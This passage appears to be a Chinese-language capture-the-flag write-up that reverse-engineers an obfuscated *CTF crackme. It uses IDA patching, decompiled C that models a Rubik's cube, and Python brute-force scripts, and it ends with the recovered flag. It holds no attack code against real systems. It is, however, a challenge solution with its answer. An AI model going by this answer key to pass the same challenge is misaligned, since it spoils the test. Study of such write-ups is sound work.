class="number">1</span>, eax)</span><br><span class="line">        <span class="keyword">elif</span> Reg == <span class="number">1</span>:</span><br><span class="line">            PatchByte(addr, <span class="number">0xB9</span>)</span><br><span class="line">            PatchDword(addr + <span class="number">1</span>, eax)</span><br><span class="line">        <span class="keyword">elif</span> Reg == <span class="number">0</span>:</span><br><span class="line">            PatchByte(addr, <span class="number">0xB8</span>)</span><br><span class="line">            PatchDword(addr + <span class="number">1</span>, eax)</span><br><span class="line">    addr = next_instr(addr)</span><br><span class="line">    MakeCode(addr)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后就可以F5, 但是由于IDA是软件分析, 所以那些函数得一个个F5…..</p><p>之后再手动去掉冗余代码, 就可以很愉快的分析了:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  _isoc99_scanf(a255s, input);</span><br><span class="line">  v8 = <span class="built_in">strlen</span>(input);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v8 / <span class="number">2</span>; ++i )</span><br><span class="line">    *v7 = (input[<span class="number">2</span> * i + <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>) | <span class="number">16</span> * (input[<span class="number">2</span> * i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">  v9[v8 / <span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  sub_39C7(v9);</span><br><span class="line">  <span class="keyword">if</span> ( sub_4638() )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x1C</span>u);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="number">0</span>;</span><br><span class="line">      v5 = cube[i];</span><br><span class="line">      v4 = mul_cube[i];</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">9</span>; ++j )</span><br><span class="line">        v3 += v4[j] * v5[j];</span><br><span class="line">      *(_DWORD *)&amp;s[<span class="number">4</span> * i] = v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(aHereIsYourFlag, s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="built_in">puts</span>(aTryAgain) | v0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v8 / <span class="number">2</span>; ++i )</span><br><span class="line">   *v7 = (input[<span class="number">2</span> * i + <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>) | <span class="number">16</span> * (input[<span class="number">2</span> * i] - <span class="string">&#x27;0&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这个循环将输入每两位一组转成十六进制数:例如输入1234会转成0x12, 0x34</p><p>主要操作为<code>sub_39C7(v9);</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_39C7</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+54h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+58h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = s[i];</span><br><span class="line">    <span class="keyword">switch</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x10</span>:</span><br><span class="line">        sub_6D47();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x15</span>:</span><br><span class="line">        sub_76DF();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">        sub_818A();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x14</span>:</span><br><span class="line">        sub_88B8();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x12</span>:</span><br><span class="line">        sub_9131();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x13</span>:</span><br><span class="line">        sub_9BE7();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x20</span>:</span><br><span class="line">        sub_A570();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x25</span>:</span><br><span class="line">        sub_AC8E();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x21</span>:</span><br><span class="line">        sub_B43B();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x24</span>:</span><br><span class="line">        sub_BC72();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x22</span>:</span><br><span class="line">        sub_C2E1();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x23</span>:</span><br><span class="line">        sub_C9C9();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x30</span>:</span><br><span class="line">        sub_D14D();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x35</span>:</span><br><span class="line">        sub_DB6D();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x31</span>:</span><br><span class="line">        sub_E5D7();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x34</span>:</span><br><span class="line">        sub_EE9E();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x32</span>:</span><br><span class="line">        sub_F7F9();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x33</span>:</span><br><span class="line">        sub_101AD();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据case可以知道我们输入的范围:<code>10~15, 20~25, 30~35</code></p><p>随便进去一个看一下(这里也有一些冗余代码我手动去掉了, , 便于分析):</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_6D47</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+5Ch] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+60h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = A[<span class="number">3</span> * i + <span class="number">2</span>];</span><br><span class="line">    A[<span class="number">3</span> * i + <span class="number">2</span>] = F[<span class="number">3</span> * i + <span class="number">2</span>];</span><br><span class="line">    F[<span class="number">3</span> * i + <span class="number">2</span>] = B[<span class="number">3</span> * i + <span class="number">2</span>];</span><br><span class="line">    B[<span class="number">3</span> * i + <span class="number">2</span>] = E[<span class="number">3</span> * i + <span class="number">2</span>];</span><br><span class="line">    E[<span class="number">3</span> * i + <span class="number">2</span>] = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sub_5C20(D);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>应该是个轮换。</p><p>再根据经验不难推出, 这应该是一个3阶魔方:<code>一共6个面, 每个面有9个元素, 共有3*6=18种操作</code></p><p>判断函数sub_4638():</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_4638</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> (*v0)[<span class="number">9</span>]; <span class="comment">// ST00_4</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+8h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">6</span> &amp;&amp; v3; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = cube[i];</span><br><span class="line">    v3 = ((*v0)[<span class="number">7</span>] + (*v0)[<span class="number">5</span>] + (*v0)[<span class="number">4</span>] + (*v0)[<span class="number">3</span>] + (*v0)[<span class="number">1</span>] == cmp[<span class="number">2</span> * i + <span class="number">1</span>]) &amp; ((*v0)[<span class="number">8</span>]+ (*v0)[<span class="number">6</span>]+ (*v0)[<span class="number">4</span>] + (*v0)[<span class="number">2</span>] + (*v0)[<span class="number">0</span>] == cmp[<span class="number">2</span> * i]) &amp; (<span class="keyword">unsigned</span> __int8)v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以分析出, 该判断为每个魔方的:</p><p>sum(center + middle)==cmp[2 * i]</p><p>sum(center + coner)==cmp[2 * i + 1]</p><p>而得到flag的循环:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="number">0</span>;</span><br><span class="line">      v5 = cube[i];</span><br><span class="line">      v4 = mul_cube[i];</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">9</span>; ++j )</span><br><span class="line">        v3 += v4[j] * v5[j];</span><br><span class="line">      *(_DWORD *)&amp;s[<span class="number">4</span> * i] = v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(aHereIsYourFlag, s);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="穷举求解"><a href="#穷举求解" class="headerlink" title="穷举求解"></a>穷举求解</h3><p>由上述分析, 由于corner[4*6], middle[4*6], center[6], 数据量小, 可以通过穷举的方法求解:</p><h4 id="提取"><a href="#提取" class="headerlink" title="提取"></a>提取</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mul_cube = [[<span class="number">0xB849CD19</span>, <span class="number">0x55E00017</span>, <span class="number">0x844966B</span>, <span class="number">0x80C181EC</span>, <span class="number">0x686C0B3C</span>, <span class="number">0x55400592</span>, <span class="number">0xCD42168A</span>, <span class="number">0x4039E81</span>, <span class="number">0xD9DE549F</span>],[<span class="number">0x2034677D</span>, <span class="number">0x144ABD</span>, <span class="number">0x49100D00</span>, <span class="number">0xE003A0E0</span>, <span class="number">0x80F0006D</span>, <span class="number">0x8307ADD6</span>, <span class="number">0x4CF60781</span>, <span class="number">0xA0352643</span>, <span class="number">0xC580C3DE</span>],[<span class="number">0xEA8C4E24</span>, <span class="number">0x68603008</span>, <span class="number">0x687FBFFF</span>, <span class="number">0x19DE4BF9</span>, <span class="number">0x271A1179</span>, <span class="number">0x99791C4D</span>, <span class="number">0x29CBFFC</span>, <span class="number">0x2B82801E</span>, <span class="number">0x3C0307FB</span>],[<span class="number">0xDAE61CD6</span>, <span class="number">0x8F7B1BF0</span>, <span class="number">0xC56CEF1D</span>, <span class="number">0xD6493A96</span>, <span class="number">0x1808018</span>, <span class="number">0xF48001B9</span>, <span class="number">0x3712519</span>, <span class="number">0x9294F318</span>, <span class="number">0x6DE20384</span>],[<span class="number">0xF3750B04</span>, <span class="number">0x256A122A</span>, <span class="number">0x257290B</span>, <span class="number">0xC4582056</span>, <span class="number">0x204E8BC0</span>, <span class="number">0x79C7ADE7</span>, <span class="number">0xC4C20203</span>, <span class="number">0x5B961570</span>, <span class="number">0x66034856</span>],[<span class="number">0x78329E3A</span>, <span class="number">0x1D07C00</span>, <span class="number">0x4AC240E6</span>, <span class="number">0x854CFBBE</span>, <span class="number">0xABFEC404</span>, <span class="number">0x5BD80037</span>, <span class="number">0xE94CBCD8</span>, <span class="number">0x1</span>, <span class="number">0xC4CA280D</span>]]</span><br><span class="line"></span><br><span class="line">cube =  [[<span class="number">0xFDFE0BA1</span>, <span class="number">0x9A915052</span>, <span class="number">0xC96F3527</span>, <span class="number">0xF5201FCD</span>, <span class="number">0xFE32ED8F</span>, <span class="number">0xDB8E3EF9</span>, <span class="number">0x51EF954</span>, <span class="number">0xFE217F1C</span>, <span class="number">0x7B33A8BB</span>],[<span class="number">0x9CF903A1</span>, <span class="number">0xC381E2CD</span>, <span class="number">0x22B35BE4</span>, <span class="number">0x4550E6AE</span>, <span class="number">0xDC9E8F3C</span>, <span class="number">0xA9B44EAF</span>, <span class="number">0x3372486A</span>, <span class="number">0x51329F58</span>, <span class="number">0x5F2F456E</span>],[<span class="number">0x9B555A08</span>, <span class="number">0xEB1A8529</span>, <span class="number">0x9B009084</span>, <span class="number">0x9B0B7B06</span>, <span class="number">0x9967F311</span>, <span class="number">0x91FB13AB</span>, <span class="number">0x18952236</span>, <span class="number">0x6F7B9915</span>, <span class="number">0xEDD9D6D1</span>],[<span class="number">0xFB67FE21</span>, <span class="number">0x259911B0</span>, <span class="number">0x3DC4EE74</span>, <span class="number">0x98936FF0</span>, <span class="number">0xDF7502CE</span>, <span class="number">0xC3DF1016</span>, <span class="number">0xBC1220F9</span>, <span class="number">0xF54C810C</span>, <span class="number">0x715A634C</span>],[<span class="number">0x3E1637A6</span>, <span class="number">0x80F07B8D</span>, <span class="number">0xFB9CA491</span>, <span class="number">0xAD254C2E</span>, <span class="number">0xFB5A012F</span>, <span class="number">0x1AEF5581</span>, <span class="number">0xB9CC1351</span>, <span class="number">0x9A3B536D</span>, <span class="number">0xBD7FAF0F</span>],[<span class="number">0xF49AD883</span>, <span class="number">0x2C55324</span>, <span class="number">0x83BC3205</span>, <span class="number">0x43846281</span>, <span class="number">0x19382448</span>, <span class="number">0xFADB2B18</span>, <span class="number">0x9335D185</span>, <span class="number">0x94C6BF5A</span>, <span class="number">0x591685AE</span>]]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(center)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(mul_cube[i][<span class="number">4</span>]) , end = <span class="string">&#x27;, &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(corner)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    v0 = mul_cube[i]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">9</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(v0[j]), end = <span class="string">&#x27;, &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(middle)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    v0 = mul_cube[i]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">9</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(v0[j]), end = <span class="string">&#x27;, &#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="组合求值"><a href="#组合求值" class="headerlink" title="组合求值"></a>组合求值</h4><p>用cmp来center的确定值以及对应corner, middle的取值</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">corner = [<span class="number">0xfdfe0ba1</span>, <span class="number">0xc96f3527</span>, <span class="number">0x51ef954</span>, <span class="number">0x7b33a8bb</span>, <span class="number">0x9cf903a1</span>, <span class="number">0x22b35be4</span>, <span class="number">0x3372486a</span>, <span class="number">0x5f2f456e</span>, <span class="number">0x9b555a08</span>, <span class="number">0x9b009084</span>, <span class="number">0x18952236</span>, <span class="number">0xedd9d6d1</span>, <span class="number">0xfb67fe21</span>, <span class="number">0x3dc4ee74</span>, <span class="number">0xbc1220f9</span>, <span class="number">0x715a634c</span>, <span class="number">0x3e1637a6</span>, <span class="number">0xfb9ca491</span>, <span class="number">0xb9cc1351</span>, <span class="number">0xbd7faf0f</span>, <span class="number">0xf49ad883</span>, <span class="number">0x83bc3205</span>, <span class="number">0x9335d185</span>, <span class="number">0x591685ae</span>]</span><br><span class="line"></span><br><span class="line">middle = [<span class="number">0x9a915052</span>, <span class="number">0xf5201fcd</span>, <span class="number">0xdb8e3ef9</span>, <span class="number">0xfe217f1c</span>, <span class="number">0xc381e2cd</span>, <span class="number">0x4550e6ae</span>, <span class="number">0xa9b44eaf</span>, <span class="number">0x51329f58</span>, <span class="number">0xeb1a8529</span>, <span class="number">0x9b0b7b06</span>, <span class="number">0x91fb13ab</span>, <span class="number">0x6f7b9915</span>, <span class="number">0x259911b0</span>, <span class="number">0x98936ff0</span>, <span class="number">0xc3df1016</span>, <span class="number">0xf54c810c</span>, <span class="number">0x80f07b8d</span>, <span class="number">0xad254c2e</span>, <span class="number">0x1aef5581</span>, <span class="number">0x9a3b536d</span>, <span class="number">0x2c55324</span>, <span class="number">0x43846281</span>, <span class="number">0xfadb2b18</span>, <span class="number">0x94c6bf5a</span>]</span><br><span class="line"></span><br><span class="line">center = [<span class="number">0xfe32ed8f</span>, <span class="number">0xdc9e8f3c</span>, <span class="number">0x9967f311</span>, <span class="number">0xdf7502ce</span>, <span class="number">0xfb5a012f</span>, <span class="number">0x19382448</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(corner)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    corner_1 = itertools.combinations(corner, <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">for</span> corner_0 <span class="keyword">in</span> corner_1:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">            <span class="built_in">sum</span> = corner_0[<span class="number">0</span>] + corner_0[<span class="number">1</span>] + corner_0[<span class="number">2</span>] + corner_0[<span class="number">3</span>]</span><br><span class="line">            <span class="built_in">sum</span> += center[j]</span><br><span class="line">            <span class="built_in">sum</span> &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">            <span class="comment"># print(i)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">sum</span> == cmp[i * <span class="number">2</span>]:</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">hex</span>(center[j]), (<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">hex</span>, corner_0))))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;----------------------------&quot;</span>)</span><br><span class="line"><span class="comment"># print(middle)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    middle_1 = itertools.combinations(middle, <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">for</span> middle_0 <span class="keyword">in</span> middle_1:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">            <span class="built_in">sum</span> = middle_0[<span class="number">0</span>] + middle_0[<span class="number">1</span>] + middle_0[<span class="number">2</span>] + middle_0[<span class="number">3</span>]</span><br><span class="line">            <span class="built_in">sum</span> += center[j]</span><br><span class="line">            <span class="built_in">sum</span> &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">            <span class="comment"># print(i)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">sum</span> == cmp[i * <span class="number">2</span> + <span class="number">1</span>]:</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">hex</span>(center[j]), (<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">hex</span>, middle_0))))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="排列组合-穷举求解"><a href="#排列组合-穷举求解" class="headerlink" title="排列组合, 穷举求解"></a>排列组合, 穷举求解</h4><p>用可见字符进行过滤</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">center = [<span class="number">0xdf7502ce</span>, <span class="number">0x9967f311</span>, <span class="number">0xdc9e8f3c</span>,          <span class="number">0xfe32ed8f</span>, <span class="number">0x19382448</span>, <span class="number">0xfb5a012f</span>]</span><br><span class="line">corner = [</span><br><span class="line">    [<span class="number">0xfdfe0ba1</span>, <span class="number">0x7b33a8bb</span>, <span class="number">0x3dc4ee74</span>, <span class="number">0x3e1637a6</span>], [<span class="number">0xc96f3527</span>, <span class="number">0x51ef954</span>, <span class="number">0x715a634c</span>, <span class="number">0x9335d185</span>], [<span class="number">0x9b009084</span>, <span class="number">0x18952236</span>, <span class="number">0xbd7faf0f</span>, <span class="number">0x83bc3205</span>], [<span class="number">0x22b35be4</span>, <span class="number">0x3372486a</span>, <span class="number">0xedd9d6d1</span>, <span class="number">0xfb9ca491</span>], [<span class="number">0x9cf903a1</span>, <span class="number">0x9b555a08</span>, <span class="number">0xb9cc1351</span>, <span class="number">0x591685ae</span>], [<span class="number">0x5f2f456e</span>, <span class="number">0xfb67fe21</span>, <span class="number">0xbc1220f9</span>, <span class="number">0xf49ad883</span>]]</span><br><span class="line"></span><br><span class="line">middle = [</span><br><span class="line">    [<span class="number">0x51329f58</span>, <span class="number">0x6f7b9915</span>, <span class="number">0x2c55324</span>, <span class="number">0x43846281</span>], [<span class="number">0xf5201fcd</span>, <span class="number">0xdb8e3ef9</span>, <span class="number">0xeb1a8529</span>, <span class="number">0x9a3b536d</span>], [<span class="number">0xc381e2cd</span>, <span class="number">0x98936ff0</span>, <span class="number">0xc3df1016</span>, <span class="number">0x94c6bf5a</span>], [<span class="number">0x91fb13ab</span>, <span class="number">0x80f07b8d</span>, <span class="number">0xad254c2e</span>, <span class="number">0x1aef5581</span>], [<span class="number">0xfe217f1c</span>, <span class="number">0xa9b44eaf</span>, <span class="number">0x259911b0</span>, <span class="number">0xf54c810c</span>], [<span class="number">0x9a915052</span>, <span class="number">0x4550e6ae</span>, <span class="number">0x9b0b7b06</span>, <span class="number">0xfadb2b18</span>]]</span><br><span class="line"></span><br><span class="line">mul_center = [<span class="number">0x686c0b3c</span>, <span class="number">0x80f0006d</span>, <span class="number">0x271a1179</span>, <span class="number">0x1808018</span>, <span class="number">0x204e8bc0</span>, <span class="number">0xabfec404</span>]</span><br><span class="line">mul_corner = [</span><br><span class="line">    [<span class="number">0xb849cd19</span>, <span class="number">0x844966b</span>, <span class="number">0xcd42168a</span>, <span class="number">0xd9de549f</span>],    [<span class="number">0x2034677d</span>, <span class="number">0x49100d00</span>, <span class="number">0x4cf60781</span>, <span class="number">0xc580c3de</span>],    [<span class="number">0xea8c4e24</span>, <span class="number">0x687fbfff</span>, <span class="number">0x29cbffc</span>, <span class="number">0x3c0307fb</span>],    [<span class="number">0xdae61cd6</span>, <span class="number">0xc56cef1d</span>, <span class="number">0x3712519</span>, <span class="number">0x6de20384</span>],    [<span class="number">0xf3750b04</span>,  <span class="number">0x257290b</span>, <span class="number">0xc4c20203</span>, <span class="number">0x66034856</span>],    [<span class="number">0x78329e3a</span>, <span class="number">0x4ac240e6</span>, <span class="number">0xe94cbcd8</span>, <span class="number">0xc4ca280d</span>]]</span><br><span class="line">mul_middle = [</span><br><span class="line">    [<span class="number">0x55e00017</span>, <span class="number">0x80c181ec</span>, <span class="number">0x55400592</span>, <span class="number">0x4039e81</span>],    [<span class="number">0x144abd</span>, <span class="number">0xe003a0e0</span>, <span class="number">0x8307add6</span>, <span class="number">0xa0352643</span>],    [<span class="number">0x68603008</span>, <span class="number">0x19de4bf9</span>, <span class="number">0x99791c4d</span>, <span class="number">0x2b82801e</span>],    [<span class="number">0x8f7b1bf0</span>, <span class="number">0xd6493a96</span>, <span class="number">0xf48001b9</span>, <span class="number">0x9294f318</span>],    [<span class="number">0x256a122a</span>, <span class="number">0xc4582056</span>, <span class="number">0x79c7ade7</span>, <span class="number">0x5b961570</span>],    [<span class="number">0x1d07c00</span>, <span class="number">0x854cfbbe</span>, <span class="number">0x5bd80037</span>, <span class="number">0x1</span>]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-------------------&quot;</span>)</span><br><span class="line">    corner_0 = <span class="built_in">list</span>(itertools.permutations(corner[i], <span class="number">4</span>))</span><br><span class="line">    middle_0 = <span class="built_in">list</span>(itertools.permutations(middle[i], <span class="number">4</span>))</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">        corner_1 = corner_0[k]</span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">            <span class="built_in">sum</span> = center[i] * mul_center[i]</span><br><span class="line">            middle_1 = middle_0[l]</span><br><span class="line">            flag = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="comment"># print(list(map(hex, middle_1)))</span></span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                <span class="built_in">sum</span> += corner_1[m] * mul_corner[i][m]</span><br><span class="line">                <span class="built_in">sum</span> += middle_1[m] * mul_middle[i][m]</span><br><span class="line">            key = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                char = <span class="built_in">sum</span> &amp; <span class="number">0xFF</span></span><br><span class="line">                <span class="keyword">if</span> <span class="number">0x30</span> &lt;= char &lt;= <span class="number">0x39</span> <span class="keyword">or</span> <span class="number">0x41</span> &lt;= char &lt;= <span class="number">0x41</span> + <span class="number">25</span> <span class="keyword">or</span> <span class="number">0x61</span> &lt;= char &lt;= <span class="number">0x61</span> + <span class="number">25</span> <span class="keyword">or</span> <span class="built_in">ord</span>(<span class="string">&#x27;_&#x27;</span>) == char <span class="keyword">or</span> <span class="built_in">ord</span>(<span class="string">&#x27;&#123;&#x27;</span>) == char <span class="keyword">or</span> <span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>) == char <span class="keyword">or</span> <span class="built_in">ord</span>(<span class="string">&quot;*&quot;</span>) == char:</span><br><span class="line">                    flag += <span class="built_in">chr</span>(<span class="built_in">sum</span> &amp; <span class="number">0xFF</span>)</span><br><span class="line">                    <span class="built_in">sum</span> &gt;&gt;= <span class="number">8</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    key = <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> key:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-------------------</span><br><span class="line">*CTF</span><br><span class="line">erkU</span><br><span class="line">-------------------</span><br><span class="line">Gj3o</span><br><span class="line">&#123;7h1</span><br><span class="line">KP6o</span><br><span class="line">uk6W</span><br><span class="line">4gjL</span><br><span class="line">-------------------</span><br><span class="line">S_Cu</span><br><span class="line">oeps</span><br><span class="line">-------------------</span><br><span class="line">63_i</span><br><span class="line">ERNJ</span><br><span class="line">-------------------</span><br><span class="line">s_m4</span><br><span class="line">-------------------</span><br><span class="line">ukxG</span><br><span class="line">uHnr</span><br><span class="line">g1c&#125;</span><br><span class="line">4nEE</span><br><span class="line">YOcm</span><br><span class="line">AkT6</span><br><span class="line">YctL</span><br><span class="line">VRae</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据词义不难猜出flag为:</p><p>*CTF{7h1S_Cu63_is_m4g1c}</p><h2 id="Obfuscating-Macros-II"><a href="#Obfuscating-Macros-II" 